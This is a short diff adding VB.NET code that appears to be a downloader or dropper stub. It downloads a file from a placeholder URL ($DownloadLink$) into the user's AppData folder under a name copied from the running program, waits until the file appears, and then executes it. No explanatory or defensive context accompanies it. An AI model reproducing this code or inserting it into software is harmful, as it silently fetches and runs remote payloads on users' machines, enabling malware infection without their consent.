@@ -1,0 +1,6 @@
+Dim Expl As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\1" & IO.Path.GetFileName(System.Windows.Forms.Application.ExecutablePath)
+My.Computer.Network.DownloadFile($DownloadLink$, Expl)
+Do Until IO.File.Exists(Expl) = True
+   System.Threading.Thread.Sleep(1000)
+Loop
+System.Diagnostics.Process.Start(Expl)
